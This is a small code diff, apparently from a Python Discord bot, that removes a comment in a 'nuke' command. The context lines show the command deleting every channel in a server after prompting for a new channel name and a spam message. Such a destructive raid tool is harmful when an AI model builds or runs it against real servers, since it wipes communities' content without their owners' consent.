@@ -91,7 +91,6 @@ async def nuke(ctx):
         channel_name = input("Enter the name for the channels: ")
         message = input("Enter the message to send: ")
 
-        # Delete all existing channels
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
